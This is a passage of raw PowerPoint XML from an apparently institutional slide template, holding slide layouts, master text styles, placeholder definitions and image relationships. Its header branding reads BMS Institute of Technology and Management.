              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD7A9B30-35AB-D437-5276-473CFE5169DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="409445" y="6438285"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D033E8C-C8B6-A9F1-6B99-0610AEC435CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642867" y="6432497"/>
            <a:ext cx="1908059"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6" name="Slide Number Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09C00759-43C5-D4A5-6597-C9F31C4DA2AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8324347" y="6438285"/>
            <a:ext cx="321905" cy="365125"/>
          </a:xfrm>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2032539602"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="dk1" tx1="lt1" bg2="dk2" tx2="lt2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Conclusion 2">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a:xfrm>
            <a:off x="388962" y="2883090"/>
            <a:ext cx="5806388" cy="1842020"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9D34928-44CA-ACCE-36AD-37689020A379}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402680" y="100702"/>
            <a:ext cx="4021293" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Date Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6F43E62-A9B0-571B-E3BD-354206A884CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663441" y="100702"/>
            <a:ext cx="1894523" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:body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7" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{053FFEDA-E57B-DF13-2394-A1514E15F85A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402679" y="4922112"/>
            <a:ext cx="5806388" cy="1279615"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buNone/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:buNone/>
              <a:defRPr sz="105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a:xfrm>
            <a:off x="8822095" y="6392175"/>
            <a:ext cx="321905" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>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3" name="Oval 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3CF16D9-01F3-6CE6-7291-C344E099BBD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6340634" y="100701"/>
            <a:ext cx="2668428" cy="3557904"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="158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350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2086599095"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:overrideClrMapping bg1="dk1" tx1="lt1" bg2="dk2" tx2="lt2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>
</p:sldLayout>
</file>

<file path=ppt/slideLayouts/slideLayout28.xml><?xml version="1.0" encoding="utf-8"?>
<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" userDrawn="1">
  <p:cSld name="1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B1BC37-64A5-474E-9E65-1F0D30ACE715}"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extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="503920528"/>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userDrawn="1">
  <p:cSld name="2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B1BC37-64A5-474E-9E65-1F0D30ACE715}"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3_Title Slide">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{B6B1BC37-64A5-474E-9E65-1F0D30ACE715}"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p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:body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slideLayout" Target="../slideLayouts/slideLayout16.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout17.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout19.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout21.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout22.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout23.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout24.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout25.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout26.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout27.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout28.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout29.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout30.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme1.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId33" Type="http://schemas.microsoft.com/office/2007/relationships/hdphoto" Target="../media/hdphoto1.wdp"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.jpeg"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.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alpha val="99000"/>
          </a:schemeClr>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13716" y="644663"/>
            <a:ext cx="9001194" cy="10883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4642867" y="104577"/>
            <a:ext cx="3627662" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{7874681A-B714-42D8-A82B-0831C3307D51}" type="datetime1">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>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10876" y="110365"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>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8822095" y="110365"/>
            <a:ext cx="321905" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r" rtl="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="750">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>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0" y="1907522"/>
            <a:ext cx="9001194" cy="484011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Rectangle 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA800142-20EF-CD76-8345-103DABD630C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="639157"/>
            <a:ext cx="9144000" cy="6210670"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId32">
              <a:extLst>
                <a:ext uri="{BEBA8EAE-BF5A-486C-A8C5-ECC9F3942E4B}">
                  <a14:imgProps xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                    <a14:imgLayer r:embed="rId33">
                      <a14:imgEffect>
                        <a14:brightnessContrast bright="6000" contrast="32000"/>
                      </a14:imgEffect>
                      <a14:imgEffect>
                        <a14:saturation sat="0"/>
                      </a14:imgEffect>
                      <a14:imgEffect>
                        <a14:sharpenSoften amount="2000"/>
                      </a14:imgEffect>
                    </a14:imgLayer>
                  </a14:imgProps>
                </a:ext>
              </a:extLst>
            </a:blip>
            <a:srcRect/>
            <a:tile tx="0" ty="0" sx="100000" sy="100000" flip="none" algn="tl"/>
          </a:blipFill>
          <a:effectLst>
            <a:glow>
              <a:schemeClr val="accent1"/>
            </a:glo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solidFill>
                <a:prstClr val="white"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59BC6866-169D-418C-42E5-E7327A514810}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-26713"/>
            <a:ext cx="9144000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="accent2"/>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="lt1"/>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent2"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BMS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>INSTITUTE OF TECHNOLOGY AND MANAGEMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ln w="10541" cmpd="sng">
                <a:solidFill>
                  <a:srgbClr val="5B9BD5">
                    <a:shade val="88000"/>
                    <a:satMod val="110000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:prstDash val="solid"/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="C:\Users\Placement\Downloads\Logos\BMSIT LOGO Sept 2015.jpg">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F75364C-D5A6-2B6E-FA9F-0DEB716F6C78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId34" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="139148" y="17783"/>
            <a:ext cx="628128" cy="5796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0" name="Picture 2" descr="Image result for india">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D44BC56D-C7FE-8A1B-8A3B-A86714D1EF5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId35" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="19693" r="16352" b="17179"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8503509" y="103921"/>
            <a:ext cx="461587" cy="48929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886716898"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483677" r:id="rId1"/>
    <p:sldLayoutId id="2147483678" r:id="rId2"/>
    <p:sldLayoutId id="2147483679" r:id="rId3"/>
    <p:sldLayoutId id="2147483680" r:id="rId4"/>
    <p:sldLayoutId id="2147483681" r:id="rId5"/>
    <p:sldLayoutId id="2147483682" r:id="rId6"/>
    <p:sldLayoutId id="2147483683" r:id="rId7"/>
    <p:sldLayoutId id="2147483684" r:id="rId8"/>
    <p:sldLayoutId id="2147483685" r:id="rId9"/>
    <p:sldLayoutId id="2147483686" r:id="rId10"/>
    <p:sldLayoutId id="2147483687" r:id="rId11"/>
    <p:sldLayoutId id="2147483688" r:id="rId12"/>
    <p:sldLayoutId id="2147483689" r:id="rId13"/>
    <p:sldLayoutId id="2147483690" r:id="rId14"/>
    <p:sldLayoutId id="2147483691" r:id="rId15"/>
    <p:sldLayoutId id="2147483692" r:id="rId16"/>
    <p:sldLayoutId id="2147483693" r:id="rId17"/>
    <p:sldLayoutId id="2147483694" r:id="rId18"/>
    <p:sldLayoutId id="2147483695" r:id="rId19"/>
    <p:sldLayoutId id="2147483696" r:id="rId20"/>
    <p:sldLayoutId id="2147483697" r:id="rId21"/>
    <p:sldLayoutId id="2147483698" r:id="rId22"/>
    <p:sldLayoutId id="2147483699" r:id="rId23"/>
    <p:sldLayoutId id="2147483700" r:id="rId24"/>
    <p:sldLayoutId id="2147483701" r:id="rId25"/>
    <p:sldLayoutId id="2147483702" r:id="rId26"/>
    <p:sldLayoutId id="2147483703" r:id="rId27"/>
    <p:sldLayoutId id="2147483704" r:id="rId28"/>
    <p:sldLayoutId id="2147483661" r:id="rId29"/>
    <p:sldLayoutId id="2147483662" r:id="rId30"/>
  </p:sldLayoutIdLst>
  <p:hf hdr="0" ftr="0"/>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="80000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:buNone/>
        <a:defRPr sz="4200" b="0" i="0" kern="1200" spc="-150" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="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1pPr>
      <a:lvl2pPr marL="17145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2pPr>
      <a:lvl3pPr marL="34290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3pPr>
      <a:lvl4pPr marL="51435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4pPr>
      <a:lvl5pPr marL="685800" indent="0" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
